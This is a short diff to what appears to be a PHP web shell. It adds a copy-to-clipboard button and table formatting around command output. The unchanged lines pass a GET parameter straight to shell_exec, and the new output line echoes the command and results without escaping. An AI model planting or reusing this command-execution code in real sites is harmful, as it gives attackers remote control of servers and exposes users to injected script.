@@ -47,6 +47,15 @@ body::-webkit-scrollbar {
   } else {
     topbuttons[0].classList.add("button-hover");
   }
+  function copyOutput(elem) {
+    elem.innerHTML = 'Copied!';
+    const copyText = document.getElementsByTagName("pre")[0].textContent;
+    const textArea = document.createElement('textarea');
+    textArea.textContent = copyText;
+    document.body.append(textArea);
+    textArea.select();
+    document.execCommand("copy");
+  }
 </script>
 
 <div class="views">
@@ -203,7 +212,7 @@ if(isset($_GET['view'])){
         $command = $_GET['submit'];
 	if(isset($command)){
          $results = shell_exec("$command 2>&1");
-         echo "<pre>$results</pre>";      
+         echo "<table><tr class='relative'><th>Output of command:`".$command."`<button class='copyimage' style='right:40px' onclick='copyOutput(this);'>Copy</button></th></tr><tr><td><pre style='text-align:left'>$results</pre></td></tr></table>"; 
       } else {
         header('WWW-Authenticate: Basic realm="My Realm"');
         header('HTTP/1.0 401 Unauthorized');
